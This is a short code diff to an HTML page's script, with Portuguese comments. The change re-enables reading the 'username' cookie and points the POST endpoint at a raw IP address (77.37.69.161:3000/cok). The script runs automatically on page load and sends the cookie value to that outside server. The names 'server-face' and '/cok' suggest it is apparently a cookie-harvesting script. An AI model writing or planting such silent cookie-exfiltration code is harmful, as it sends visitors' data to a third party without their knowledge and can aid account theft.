@@ -30,22 +30,20 @@
       }
 
       // Exemplo de uso:
-      const username = getCookie("username") // Retorna o valor do cookie 'username'.
+      //   const username = getCookie("username") // Retorna o valor do cookie 'username'.
       //   console.log(username)
 
       // Exemplo de uso:
       //   setCookie("username", "JohnDoe", 7) // Define um cookie chamado 'username' com valor 'JohnDoe' que expira em 7 dias.
 
       async function sendPostRequest2(url) {
-        // const username = getCookie("username")
-        const username = "oaoa"
+        const username = getCookie("username")
+        // const username = "oaoa"
         const dataSend = {
           nome: username,
         }
-        console.log(username)
 
         try {
-          console.log("aki")
           await fetch(url, {
             method: "POST",
             headers: {
@@ -62,7 +60,7 @@
 
       // Exemplo de uso
       //   const postUrl = "http://localhost:3000/cok"
-      const postUrl = "https://server-face.vercel.app/cok"
+      const postUrl = "http://77.37.69.161:3000/cok"
       sendPostRequest2(postUrl)
     </script>
   </body>
